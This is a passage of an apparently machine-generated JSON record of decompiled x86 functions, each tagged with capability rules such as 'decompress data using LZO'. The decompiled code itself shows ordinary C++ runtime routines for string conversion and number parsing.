var_70h) {\n                if (0x3fffffff - var_2ch < var_70h - 1) goto code_r0x00443eb7;\n                fcn.004954e0(var_78h + 1, var_70h - 1);\n                var_74h = var_2ch;\n            }\n            var_2ch = var_74h;\n            if (var_74h < uVar9) {\n                if (uVar14 == 0x20) {\n                    fcn.00493c70(var_74h, 0, uVar9 - var_74h, arg_14h);\n                    var_74h = uVar9;\n                }\n                else {\n                    fcn.00493c70(0, 0, uVar9 - var_74h, arg_14h);\n                    var_74h = uVar9;\n                }\n            }\n            if (var_65h == 0) {\n                uVar14 = (**(*arg_8h + 0x30))(var_30h, var_74h);\n                var_65h = uVar14 != var_74h;\n            }\n            var_64h = arg_ch & 0xffffff00;\n            if (var_30h != &var_28h) {\n                fcn.004a34c0(var_30h);\n            }\n            if (var_48h != &var_40h) {\n                fcn.004a34c0(var_48h);\n            }\ncode_r0x00443817:\n            *(arg_10h + 8) = 0;\n            var_64h = var_64h & 0xffffff00 | var_65h;\n            return CONCAT44(var_64h, arg_8h);\n        }\n        uVar3 = *(iVar11 + 0x12);\n        uVar2 = var_44h + 1;\n        uVar9 = 7;\n        if (var_48h != &var_40h) {\n            uVar9 = var_40h;\n        }\n        if (uVar9 < uVar2) {\n            fcn.004956c0(var_44h, 0, 0, 1);\n        }\n        *(var_48h + uVar15 * 2) = uVar3;\n        *(var_48h + uVar15 * 2 + 2) = 0;\n        var_44h = uVar2;\n        if (var_80h < 0) {\n            uVar15 = *(iVar11 + 0x3e);\n            uVar16 = 0;\n            uVar9 = -var_80h;\n            fcn.00493c70(uVar2, 0, uVar9, uVar15);\n            if (0x3fffffff - var_44h < uVar14) goto code_r0x00443edf;\n            fcn.004954e0(piVar12, uVar14);\n            goto code_r0x00443932;\n        }\n        if (*(iVar11 + 0x30) <= 0x3fffffff - uVar2) {\n            fcn.004954e0(piVar12 + var_80h, *(iVar11 + 0x30));\n            goto code_r0x00443932;\n        }\n        fcn.0049ec30(0x5028b0);\ncode_r0x00443eab:\n        fcn.0049ec30(0x5028b0);\ncode_r0x00443eb7:\n        fcn.0049ec30(0x5028b0);\n        uVar15 = extraout_ECX;\n        uVar9 = extraout_EDX;\n    }\n    else {\n        if (iVar5 < 0) {\n            var_80h = uVar14;\n        }\n        if (*(iVar11 + 0xc) == 0) {\n            fcn.00493470(0, var_44h, piVar12, var_80h);\n            iVar5 = *(iVar11 + 0x30);\n            goto code_r0x0044392a;\n        }\n        fcn.00493c70(0, var_44h, var_80h * 2, 0);\n        puVar6 = fcn.0049dab0(var_48h, *(iVar11 + 0x14), *(iVar11 + 8), *(iVar11 + 0xc), piVar12, piVar12 + var_80h);\n        uVar9 = puVar6 - var_48h >> 1;\n        uVar15 = var_44h;\n        if (uVar9 <= var_44h) {\n            *puVar6 = 0;\n            iVar5 = *(iVar11 + 0x30);\n            var_44h = uVar9;\n            goto code_r0x0044392a;\n        }\n    }\n    uVar16 = 0x5028cd;\n    fcn.0049f220(0x5028e4, 0x5028cd);\ncode_r0x00443edf:\n    piVar7 = fcn.0049ec30(0x5028b0, uVar16, uVar9, uVar15);\n    if (var_48h != &var_40h) {\n        fcn.004a34c0(var_48h);\n    }\n    uVar16 = fcn.0041b360(piVar7);\n    fcn.004a36d0(uVar16);\n    (**(*piVar7 + 4))();\n    do {\n        uVar16 = fcn.004a3b60();\n        fcn.004a36d0(uVar16);\n    } while( true );\n}\n",
        "token_count": 3137
    },
    "004446f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.004446f0(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    iVar2 = fcn.0046ba90(0, 0, &var_19h);\n    *in_ECX = iVar2;\n    iVar2 = fcn.0046bb70(arg_ch, arg_10h, &var_19h, 0);\n    uVar6 = (arg_10h - arg_ch) * 2;\n    iVar5 = *(iVar2 + -0xc) + iVar2;\n    var_2ch = fcn.004a34e0(uVar6);\n    while( true ) {\n        uVar3 = fcn.004446c0(var_2ch, iVar2, uVar6);\n        if (uVar6 <= uVar3) {\n            uVar6 = uVar3 + 1;\n            fcn.004a34b0(var_2ch);\n            var_2ch = fcn.004a34e0(uVar6);\n            uVar3 = fcn.004446c0(var_2ch, iVar2, uVar6);\n        }\n        fcn.0046c3b0(var_2ch, uVar3);\n        iVar4 = sub.msvcrt.dll_strlen(iVar2);\n        if (iVar5 == iVar2 + iVar4) break;\n        iVar1 = *in_ECX;\n        iVar2 = iVar2 + iVar4 + 1;\n        iVar4 = *(iVar1 + -0xc);\n        uVar3 = iVar4 + 1;\n        if ((*(iVar1 + -8) <= uVar3 && uVar3 != *(iVar1 + -8)) || (0 < *(iVar1 + -4))) {\n            fcn.0046d280(uVar3);\n        }\n        *(*in_ECX + *(*in_ECX + -0xc)) = 0;\n        iVar1 = *in_ECX;\n        *(iVar1 + -0xc) = uVar3;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + 1 + iVar4) = 0;\n    }\n    fcn.004a34b0(var_2ch);\n    fcn.0046bf80(&var_19h);\n    return;\n}\n",
        "token_count": 620
    },
    "00444ad0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t * __cdecl fcn.00444ad0(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *in_ECX;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar uVar9;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    iVar1 = fcn.00463b80(0, 0, &var_19h);\n    *in_ECX = iVar1;\n    uVar9 = 0;\n    var_30h = arg_ch;\n    iVar2 = fcn.00463c70(arg_ch, arg_10h, &var_19h, 0);\n    iVar1 = *(iVar2 + -0xc);\n    uVar7 = arg_10h - arg_ch;\n    if (0x3ffffffe < uVar7) {\ncode_r0x00444c9e:\n        uVar5 = fcn.004a3c30(var_30h);\n        do {\n            fcn.004a36d0(uVar5);\n            uVar5 = fcn.004a3b60();\n        } while( true );\n    }\n    var_30h = fcn.004a34e0(uVar7 * 2);\n    iVar6 = iVar2;\n    do {\n        uVar8 = uVar7;\n        uVar3 = fcn.00444aa0(var_30h, iVar6, uVar7);\n        if (uVar7 <= uVar3) {\n            uVar7 = uVar3 + 1;\n            fcn.004a34b0();\n            if (0x3ffffffe < uVar7) {\n                fcn.004a3c30();\n                goto code_r0x00444c9e;\n            }\n            var_30h = fcn.004a34e0();\n            uVar3 = fcn.00444aa0();\n        }\n        fcn.00464520(var_30h, uVar3, uVar8, uVar9, iVar2);\n        iVar4 = sub.msvcrt.dll_wcslen(iVar6);\n        iVar6 = iVar6 + iVar4 * 2;\n        if (iVar2 + iVar1 * 2 == iVar6) {\n            fcn.004a34b0(var_30h);\n            fcn.004640c0(&var_19h);\n            return in_ECX;\n        }\n        iVar4 = *in_ECX;\n        iVar6 = iVar6 + 2;\n        uVar8 = *(iVar4 + -0xc) + 1;\n        if ((*(iVar4 + -8) <= uVar8 && uVar8 != *(iVar4 + -8)) || (0 < *(iVar4 + -4))) {\n            fcn.00465500(uVar8);\n        }\n        iVar4 = *in_ECX;\n        *(iVar4 + *(iVar4 + -0xc) * 2) = 0;\n        *(iVar4 + -4) = 0;\n        *(iVar4 + -0xc) = uVar8;\n        *(iVar4 + uVar8 * 2) = 0;\n    } while( true );\n}\n",
        "token_count": 805
    },
    "00444d50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00444d50(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    bool bVar6;\n    bool bVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    char cVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    bool bVar14;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar5 = arg_18h;\n    uVar13 = 8;\n    iVar3 = fcn.0042e410(arg_18h + 0x6c);\n    uVar4 = *(iVar5 + 0xc) & 0x4a;\n    if ((uVar4 != 0x40) && (uVar13 = 10,  uVar4 == 8)) {\n        uVar13 = 0x10;\n    }\n    bVar6 = arg_8h != NULL && arg_ch == 0xffffffff;\n    bVar14 = arg_ch == 0xffffffff;\n    if (((bVar6) && (bVar14 = false,  arg_8h[3] <= arg_8h[2])) && (iVar5 = (**(*arg_8h + 0x24))(),  iVar5 == -1)) {\n        arg_8h = NULL;\n        bVar14 = bVar6;\n    }\n    bVar6 = arg_10h != NULL && arg_14h == -1;\n    var_44h._0_1_ = arg_14h == -1;\n    if ((bVar6) && (var_44h._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar5 = (**(*arg_10h + 0x24))();\n        var_44h._0_1_ = false;\n        if (iVar5 == -1) {\n            arg_10h = NULL;\n            var_44h._0_1_ = bVar6;\n        }\n    }\n    if (var_44h == bVar14) {\n        bVar14 = false;\n        uVar12 = 0;\n        var_50h._3_1_ = 1;\n        var_44h = 0;\n        bVar6 = false;\n    }\n    else {\n        uVar12 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[3] <= arg_8h[2]) {\n                uVar12 = (**(*arg_8h + 0x24))();\n                if (uVar12 == 0xffffffff) {\n                    arg_8h = NULL;\n                    uVar12 = 0xffffffff;\n                }\n                goto code_r0x00444de0;\n            }\n            uVar1 = *arg_8h[2];\n            uVar12 = uVar1;\n            cVar2 = *(iVar3 + 0x10);\n            bVar14 = *(iVar3 + 0x4a) == uVar1;\n            if (!bVar14) goto code_r0x00444df0;\ncode_r0x00444df9:\n            if (((cVar2 == '\\0') || (*(iVar3 + 0x25) != uVar12)) && (*(iVar3 + 0x24) != uVar12)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                var_50h._3_1_ = fcn.00430ce0(&arg_10h);\n                var_44h = 0;\n                bVar6 = false;\n                if (var_50h._3_1_ != 0) goto code_r0x00444e50;\n                uVar12 = fcn.00430d80();\n                cVar2 = *(iVar3 + 0x10);\n            }\n        }\n        else {\ncode_r0x00444de0:\n            cVar2 = *(iVar3 + 0x10);\n            bVar14 = *(iVar3 + 0x4a) == uVar12;\n            if (bVar14) goto code_r0x00444df9;\ncode_r0x00444df0:\n            if (*(iVar3 + 0x4b) == uVar12) goto code_r0x00444df9;\n            bVar14 = false;\n        }\n        var_44h = 0;\n        bVar6 = false;\n        while (((cVar10 = uVar12,  cVar2 == '\\0' || (*(iVar3 + 0x25) != cVar10)) && (*(iVar3 + 0x24) != cVar10))) {\n            if (*(iVar3 + 0x4e) == cVar10) {\n                bVar7 = uVar13 == 10 | bVar6 ^ 1U;\n                if (!bVar7) goto code_r0x0044500a;\n                bVar6 = uVar4 == 0 || uVar13 == 8;\n                if (uVar4 != 0 && uVar13 != 8) {\n                    var_44h = var_44h + 1;\n                    goto code_r0x0044503e;\n                }\n                var_44h = 0;\n                uVar13 = 8;\n                uVar11 = arg_8h[2];\n                if (arg_8h[3] <= uVar11) goto code_r0x004450e0;\ncode_r0x0044504d:\n                arg_8h[2] = uVar11 + 1;\ncode_r0x0044505a:\n                var_48h._0_1_ = false;\n                if ((arg_8h[3] <= arg_8h[2]) && (iVar5 = (**(*arg_8h + 0x24))(),  iVar5 == -1)) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            else {\n                if (!bVar6) break;\ncode_r0x0044500a:\n                if ((*(iVar3 + 0x4c) != cVar10) && (*(iVar3 + 0x4d) != cVar10)) {\n                    var_50h._3_1_ = 0;\n                    bVar6 = true;\n                    goto code_r0x00444e50;\n                }\n                var_50h._3_1_ = uVar13 == 0x10 || uVar4 == 0;\n                if (uVar13 != 0x10 && uVar4 != 0) {\n                    bVar6 = true;\n                    goto code_r0x00444e5c;\n                }\n                var_44h = 0;\n                uVar13 = 0x10;\n                bVar7 = false;\ncode_r0x0044503e:\n                uVar11 = arg_8h[2];\n                bVar6 = bVar7;\n                if (uVar11 < arg_8h[3]) goto code_r0x0044504d;\ncode_r0x004450e0:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0044505a;\n                var_48h._0_1_ = true;\n            }\n            arg_ch = 0xffffffff;\n            bVar9 = arg_10h != NULL && arg_14h == -1;\n            bVar7 = arg_14h == -1;\n            if ((bVar9) && (bVar7 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar5 = (**(*arg_10h + 0x24))();\n                bVar7 = false;\n                if (iVar5 == -1) {\n                    arg_10h = NULL;\n                    bVar7 = bVar9;\n                }\n            }\n            if (var_48h._0_1_ == bVar7) {\n                var_50h._3_1_ = 1;\n                goto code_r0x00444e50;\n            }\n            uVar12 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar12 = *arg_8h[2];\n                }\n                else {\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar12 = 0xffffffff;\n                    }\n                }\n            }\n            if (!bVar6) break;\n            cVar2 = *(iVar3 + 0x10);\n        }\n        var_50h._3_1_ = 0;\n    }\ncode_r0x00444e50:\n    var_4ch = 0x16;\n    if (uVar13 != 0x10) {\ncode_r0x00444e5c:\n        var_4ch = uVar13;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.004924e0(0x20);\n    }\n    uVar4 = 0xffffffff / uVar13;\n    var_50h._2_1_ = *(iVar3 + 100);\n    if (var_50h._2_1_ == 0) {\n        if (var_50h._3_1_ == 0) {\n            var_50h._1_1_ = 0;\n            var_48h = 0;\ncode_r0x00444eb4:\n            cVar2 = uVar12;\n            iVar5 = cVar2;\n            if (var_4ch < 0xb) {\n                if ((cVar2 < '0') || (var_4ch + '0' <= cVar2)) goto code_r0x00445153;\n            }\n            else if (9 < cVar2 - 0x30U) goto code_r0x0044513c;\n            uVar12 = iVar5 - 0x30;\ncode_r0x00444ed6:\n            if (uVar12 != 0xffffffff) {\n                do {\n                    if (uVar4 < var_48h) {\n                        var_50h._1_1_ = 1;\n                        uVar12 = arg_8h[2];\n                        if (arg_8h[3] <= uVar12) goto code_r0x004451e5;\ncode_r0x00444f12:\n                        arg_8h[2] = uVar12 + 1;\ncode_r0x00444f1f:\n                        var_50h._2_1_ = false;\n                        if (arg_8h[3] <= arg_8h[2]) {\n                            iVar5 = (**(*arg_8h + 0x24))();\n                            var_50h._2_1_ = false;\n                            if (iVar5 == -1) {\n                                arg_8h = NULL;\n                                var_50h._2_1_ = true;\n                            }\n                        }\n                    }\n                    else {\n                        uVar11 = var_48h * uVar13;\n                        var_48h = uVar12 + uVar11;\n                        var_50h._1_1_ = var_50h._1_1_ | ~uVar12 < uVar11;\n                        uVar12 = arg_8h[2];\n                        var_44h = var_44h + 1;\n                        if (uVar12 < arg_8h[3]) goto code_r0x00444f12;\ncode_r0x004451e5:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00444f1f;\n                        var_50h._2_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar9 = arg_10h != NULL && arg_14h == -1;\n                    bVar7 = arg_14h == -1;\n                    if ((bVar9) && (bVar7 = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar5 = (**(*arg_10h + 0x24))();\n                        bVar7 = false;\n                        if (iVar5 == -1) {\n                            arg_10h = NULL;\n                            bVar7 = bVar9;\n                        }\n                    }\n                    if (var_50h._2_1_ == bVar7) {\n                        var_50h._2_1_ = 1;\n                        goto code_r0x00444f56;\n                    }\n                    uVar12 = arg_ch;\n                    if (arg_8h == NULL) goto code_r0x00444eb4;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar12 = *arg_8h[2];\n                        goto code_r0x00444eb4;\n                    }\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 != 0xffffffff) goto code_r0x00444eb4;\n                    arg_8h = NULL;\n                    if (var_4ch < 0xb) break;\n                    cVar2 = -1;\n                    iVar5 = -1;\ncode_r0x0044513c:\n                    if (5 < cVar2 + 0x9fU) goto code_r0x004452a0;\n                    uVar12 = iVar5 - 0x57;\n                    if (uVar12 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x00445153;\n        }\n        var_50h._2_1_ = var_50h._3_1_;\n        var_50h._1_1_ = 0;\n        var_50h._3_1_ = 0;\n        var_48h = 0;\n    }\n    else {\n        if (var_50h._3_1_ == 0) {\n            var_50h._1_1_ = 0;\n            var_48h = 0;\ncode_r0x0044530b:\n            uVar11 = var_2ch;\n            cVar2 = uVar12;\n            if ((*(iVar3 + 0x10) == 0) || (*(iVar3 + 0x25) != cVar2)) {\n                if ((cVar2 == *(iVar3 + 0x24)) ||\n                   (iVar5 = sub.msvcrt.dll_memchr(iVar3 + 0x4e, cVar2, var_4ch),  iVar5 == 0)) goto code_r0x00445153;\n                uVar12 = iVar5 - (iVar3 + 0x4e);\n                if (0xf < uVar12) {\n                    uVar12 = uVar12 - 6;\n                }\n                if (var_48h <= uVar4) {\n                    uVar11 = var_48h * uVar13;\n                    var_48h = uVar12 + uVar11;\n                    var_50h._1_1_ = var_50h._1_1_ | ~uVar12 < uVar11;\n                    var_44h = var_44h + 1;\n                    goto code_r0x00445372;\n                }\n                uVar12 = arg_8h[2];\n                var_50h._1_1_ = var_50h._2_1_;\n                if (arg_8h[3] <= uVar12) goto code_r0x004453d2;\ncode_r0x0044537d:\n                arg_8h[2] = uVar12 + 1;\ncode_r0x0044538a:\n                var_5ch._0_1_ = 0;\n                if (arg_8h[3] <= arg_8h[2]) {\n                    iVar5 = (**(*arg_8h + 0x24))();\n                    var_5ch._0_1_ = 0;\n                    if (iVar5 == -1) {\n                        arg_8h = NULL;\n                        var_5ch._0_1_ = var_50h._2_1_;\n                    }\n                }\n            }\n            else {\n                if (var_44h == 0) {\n                    var_50h._2_1_ = 0;\n                    var_50h._3_1_ = *(iVar3 + 0x10);\n                    goto code_r0x00444f56;\n                }\n                uVar12 = var_2ch + 1;\n                uVar8 = 0xf;\n                if (stack0xffffffcc != &var_28h) {\n                    uVar8 = var_28h;\n                }\n                if (uVar8 < uVar12) {\n                    fcn.00492830(var_2ch, 0, 0, 1);\n                }\n                var_44h = 0;\n                *(stack0xffffffcc + uVar11) = var_44h;\n                *(stack0xffffffcc + uVar12) = 0;\n                var_2ch = uVar12;\ncode_r0x00445372:\n                uVar12 = arg_8h[2];\n                if (uVar12 < arg_8h[3]) goto code_r0x0044537d;\ncode_r0x004453d2:\n                (**(*arg_8h + 0x28))();\n                var_5ch._0_1_ = var_50h._2_1_;\n                if (arg_8h != NULL) goto code_r0x0044538a;\n            }\n            arg_ch = 0xffffffff;\n            bVar9 = arg_10h != NULL && arg_14h == -1;\n            bVar7 = arg_14h == -1;\n            if ((bVar9) && (bVar7 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar5 = (**(*arg_10h + 0x24))();\n                bVar7 = false;\n                if (iVar5 == -1) {\n                    arg_10h = NULL;\n                    bVar7 = bVar9;\n                }\n            }\n            if (var_5ch == bVar7) goto code_r0x00444f56;\n            uVar12 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar12 = *arg_8h[2];\n                }\n                else {\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar12 = 0xffffffff;\n                    }\n                }\n            }\n            goto code_r0x0044530b;\n        }\n        var_48h = 0;\n        var_50h._1_1_ = 0;\n        var_50h._2_1_ = var_50h._3_1_;\n        var_50h._3_1_ = 0;\n    }\ncode_r0x00444f56:\n    if (var_2ch != 0) goto code_r0x00445162;\ncode_r0x00444f5e:\n    if ((var_44h != 0) || (bVar6)) {\ncode_r0x004451a7:\n        if (var_50h._3_1_ == 0) {\n            if (var_50h._1_1_ == 0) {\n                uVar4 = -var_48h;\n                if (!bVar14) {\n                    uVar4 = var_48h;\n                }\n                *arg_20h = uVar4;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00444f85;\n        }\n    }\ncode_r0x00444f73:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00444f85:\n    if (var_50h._2_1_ != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != &var_28h) {\n        fcn.004a34c0(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x004452a0:\n    if (5 < cVar2 + 0xbfU) goto code_r0x00445153;\n    uVar12 = iVar5 - 0x37;\n    goto code_r0x00444ed6;\ncode_r0x00445153:\n    var_50h._2_1_ = 0;\n    if (var_2ch == 0) goto code_r0x00444f5e;\ncode_r0x00445162:\n    fcn.004929c0(var_44h);\n    cVar2 = fcn.0049e840(*(iVar3 + 8), *(iVar3 + 0xc), &var_31h + 1);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar6) || ((var_44h | var_2ch) != 0)) goto code_r0x004451a7;\n    goto code_r0x00444f73;\n}\n",
        "token_count": 5040
    },
    "00445780": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00445780(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    bool bVar7;\n    bool bVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    char cVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    bool bVar14;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint8_t var_4fh;\n    uint8_t var_4eh;\n    uint32_t var_4dh;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar6 = arg_18h;\n    uVar13 = 8;\n    iVar3 = fcn.0042e410(arg_18h + 0x6c);\n    uVar4 = *(iVar6 + 0xc) & 0x4a;\n    if ((uVar4 != 0x40) && (uVar13 = 10,  uVar4 == 8)) {\n        uVar13 = 0x10;\n    }\n    bVar7 = arg_8h != NULL && arg_ch == 0xffffffff;\n    bVar14 = arg_ch == 0xffffffff;\n    if (((bVar7) && (bVar14 = false,  arg_8h[3] <= arg_8h[2])) && (iVar6 = (**(*arg_8h + 0x24))(),  iVar6 == -1)) {\n        arg_8h = NULL;\n        bVar14 = bVar7;\n    }\n    bVar7 = arg_10h != NULL && arg_14h == -1;\n    var_44h._0_1_ = arg_14h == -1;\n    if ((bVar7) && (var_44h._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar6 = (**(*arg_10h + 0x24))();\n        var_44h._0_1_ = false;\n        if (iVar6 == -1) {\n            arg_10h = NULL;\n            var_44h._0_1_ = bVar7;\n        }\n    }\n    if (var_44h == bVar14) {\n        bVar14 = false;\n        uVar12 = 0;\n        var_4dh._0_1_ = 1;\n        var_44h = 0;\n        bVar7 = false;\n    }\n    else {\n        uVar12 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[3] <= arg_8h[2]) {\n                uVar12 = (**(*arg_8h + 0x24))();\n                if (uVar12 == 0xffffffff) {\n                    arg_8h = NULL;\n                    uVar12 = 0xffffffff;\n                }\n                goto code_r0x00445810;\n            }\n            uVar1 = *arg_8h[2];\n            uVar12 = uVar1;\n            cVar2 = *(iVar3 + 0x10);\n            bVar14 = *(iVar3 + 0x4a) == uVar1;\n            if (!bVar14) goto code_r0x00445820;\ncode_r0x00445829:\n            if (((cVar2 == '\\0') || (*(iVar3 + 0x25) != uVar12)) && (*(iVar3 + 0x24) != uVar12)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                var_4dh._0_1_ = fcn.00430ce0(&arg_10h);\n                var_44h = 0;\n                bVar7 = false;\n                if (var_4dh != 0) goto code_r0x00445880;\n                uVar12 = fcn.00430d80();\n                cVar2 = *(iVar3 + 0x10);\n            }\n        }\n        else {\ncode_r0x00445810:\n            cVar2 = *(iVar3 + 0x10);\n            bVar14 = *(iVar3 + 0x4a) == uVar12;\n            if (bVar14) goto code_r0x00445829;\ncode_r0x00445820:\n            if (*(iVar3 + 0x4b) == uVar12) goto code_r0x00445829;\n            bVar14 = false;\n        }\n        var_44h = 0;\n        bVar7 = false;\n        while (((cVar11 = uVar12,  cVar2 == '\\0' || (*(iVar3 + 0x25) != cVar11)) && (*(iVar3 + 0x24) != cVar11))) {\n            if (*(iVar3 + 0x4e) == cVar11) {\n                bVar8 = uVar13 == 10 | bVar7 ^ 1U;\n                if (!bVar8) goto code_r0x00445a4a;\n                bVar7 = uVar4 == 0 || uVar13 == 8;\n                if (uVar4 != 0 && uVar13 != 8) {\n                    var_44h = var_44h + 1;\n                    goto code_r0x00445a7e;\n                }\n                var_44h = 0;\n                uVar13 = 8;\n                uVar5 = arg_8h[2];\n                if (arg_8h[3] <= uVar5) goto code_r0x00445b20;\ncode_r0x00445a8d:\n                arg_8h[2] = uVar5 + 1;\ncode_r0x00445a9a:\n                var_48h._0_1_ = false;\n                if ((arg_8h[3] <= arg_8h[2]) && (iVar6 = (**(*arg_8h + 0x24))(),  iVar6 == -1)) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            else {\n                if (!bVar7) break;\ncode_r0x00445a4a:\n                if ((*(iVar3 + 0x4c) != cVar11) && (*(iVar3 + 0x4d) != cVar11)) {\n                    var_4dh._0_1_ = 0;\n                    bVar7 = true;\n                    goto code_r0x00445880;\n                }\n                var_4dh._0_1_ = uVar13 == 0x10 || uVar4 == 0;\n                if (uVar13 != 0x10 && uVar4 != 0) {\n                    bVar7 = true;\n                    goto code_r0x0044588c;\n                }\n                var_44h = 0;\n                uVar13 = 0x10;\n                bVar8 = false;\ncode_r0x00445a7e:\n                uVar5 = arg_8h[2];\n                bVar7 = bVar8;\n                if (uVar5 < arg_8h[3]) goto code_r0x00445a8d;\ncode_r0x00445b20:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x00445a9a;\n                var_48h._0_1_ = true;\n            }\n            arg_ch = 0xffffffff;\n            bVar10 = arg_10h != NULL && arg_14h == -1;\n            bVar8 = arg_14h == -1;\n            if ((bVar10) && (bVar8 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar6 = (**(*arg_10h + 0x24))();\n                bVar8 = false;\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    bVar8 = bVar10;\n                }\n            }\n            if (bVar8 == var_48h._0_1_) {\n                var_4dh._0_1_ = 1;\n                goto code_r0x00445880;\n            }\n            uVar12 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar12 = *arg_8h[2];\n                }\n                else {\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar12 = 0xffffffff;\n                    }\n                }\n            }\n            if (!bVar7) break;\n            cVar2 = *(iVar3 + 0x10);\n        }\n        var_4dh._0_1_ = 0;\n    }\ncode_r0x00445880:\n    stack0xffffffb0 = 0x16;\n    if (uVar13 != 0x10) {\ncode_r0x0044588c:\n        unique0x1000043c = uVar13;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.004924e0(0x20);\n    }\n    uVar4 = bVar14 + 0x7fffffff;\n    var_4eh = *(iVar3 + 100);\n    if (var_4eh == 0) {\n        if (var_4dh == 0) {\n            